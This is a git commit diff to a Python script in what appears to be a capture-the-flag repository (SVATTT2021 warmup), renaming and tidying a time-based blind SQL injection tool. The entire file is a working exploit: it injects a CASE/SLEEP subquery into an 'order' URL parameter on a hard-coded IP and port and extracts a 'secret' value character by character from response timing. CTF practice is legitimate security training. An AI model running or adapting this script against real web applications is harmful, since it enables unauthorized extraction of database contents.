843be5428ce546a52d07b1243fa2785d540017cb
0x6e6869 <54947098+magnetohvcs@users.noreply.github.com>
2021-10-18 11:46:00 +0700

    Update and rename sql2.py to sqli.py

--- SVATTT2021/warmup/sqli.py
+++ SVATTT2021/warmup/sqli.py
@@ -1,25 +1,24 @@
 import requests,string, time
 arr = '_'  +string.ascii_uppercase +string.digits + string.ascii_lowercase  +string.punctuation
 s = requests.session()
-def bind1r(step):
+def bind(step):
     for i in arr:
         a = time.time()
         url = f"http://125.235.240.166:20105/index?order=price asc, (select case when (select ascii(mid((select secret from flag limit 1),{step},1))) LIKE {ord(i)} then sleep(2) else 1 end)"
         s.get(url)
-        
         b = time.time()
         if  b-a > 8:
             return i
-    return ""    
-def dumpAllrow():
-    table = ''
-    d = len(table) + 1
+    return None   
+def flag():
+    flag = ''
+    d = len(flag) + 1
     while 1:
-        character = bind1r(d)
-        if character == '':
-            return table
-        table += character
+        c = bind(d)
+        if c == None:
+            return flag
+        flag += c
         d += 1
-        print(table) 
+        print(flag) 
 
-dumpAllrow()
+print(flag())
